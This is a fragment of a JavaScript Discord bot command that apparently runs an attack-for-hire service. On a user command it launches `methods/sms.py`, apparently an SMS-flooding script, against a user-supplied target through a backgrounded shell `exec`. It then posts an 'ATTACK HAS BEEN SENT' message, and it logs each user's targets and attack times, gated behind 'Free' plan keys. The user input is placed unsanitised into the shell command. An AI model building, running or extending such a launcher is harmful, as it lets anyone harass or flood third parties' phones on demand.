                                    ], ephemeral: true 
                                  });
                                  setTimeout(() => { interaction.deleteReply()}, 5000);
                                  return;
                                }

                                async function fetchData() {
                                    try {

                                        if (2 > 1) {

                                                exec(`screen -dm -S SmS timeout ${time} python3 methods/sms.py ${host} ${time}`, (error, stdout) => {});

                                                const embed = new EmbedBuilder()
                                                    .setColor('Random')
                                                    .setTitle(version)
                                                    .addFields(
                                                    {
                                                      name: "**`👨‍💻 User:`**",
                                                      value: ` [ ${interaction.user.username} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🔗 Target:`**",
                                                      value: ` [ ${host} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💥 Method:`**",
                                                      value: ` [ ${methods} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🕒 Time:`**",
                                                      value: ` [ ${time} seconds ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💸 Plan:`**",
                                                      value: ` [ SmS ] `,
                                                      inline: true,
                                                    })
                                                    .setImage(randomgif)
                                                    .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                    .setTimestamp();
                                                    interaction.user.send({ embeds: [embed] }).catch(async (err) => {
                                                        console.log(err)
                                                        return await interaction.reply({
                                                            content: `**ERROR**: It\'s not possible to send an attack.`, ephemeral: true
                                                        }).catch((err) => {})
                                                    })

                                                    await interaction.reply({
                                                        embeds: [
                                                          new EmbedBuilder()
                                                            .setColor('Random')
                                                            .setTitle(version)
                                                            .setDescription("```css\n[ ATTACK HAS BEEN SENT ]\n\```")
                                                            .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                            .setTimestamp(),
                                                        ], ephemeral: true 
                                                    }).catch((err) =>{})
                                                    setTimeout(() => { interaction.deleteReply()}, 5000);
                                                    const currentTime = Date.now();
                                                    const expirationTime = currentTime + time * 1000;
                                                    const logMessage = `${interaction.user.id} ${methods} ${host} ${expirationTime}`;
                                                    const maxHistoryEntries = 5;

                                                    fs.readFile(fileOngoing, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(fileOngoing, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });

                                                    const userHistory = path.join(__dirname, '..', '..', 'database', 'logs', `${interaction.user.id}.txt`);

                                                    if (!fs.existsSync(userHistory)) {
                                                        fs.writeFileSync(userHistory, '', 'utf8');
                                                    }

                                                    fs.readFile(userHistory, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const currentTime = moment().tz('Asia/Ho_Chi_Minh').format('HH:mm:ss DD-MM-YYYY');
                                                        const logMessage = `${interaction.user.username}: Method: ${methods} | Target ${host} | Time: ${time} | Attack at: ${currentTime}\n`;

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(userHistory, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });
                                        }
                                    } catch (error) {
                                        console.error('Lỗi khi gửi yêu cầu GET:', error);
                                        interaction.reply({ content: '**ERROR**: It\'s not possible to send an attack.', ephemeral: true });
                                    }
                                }
                                fetchData();
                            }

                        } else {
                            interaction.reply({
                              embeds: [
                              new EmbedBuilder()
                                  .setColor('Random')
                                  .setTitle(`ERROR`)
                                  .setDescription('You need to have the **`Free`** plan to use this command. If you don\'t have a free plan, use \`/getkey\` to obtain one.')
                                ], ephemeral: true
                            });
                        }
                    }
                });
            }
          }
        });
    },
};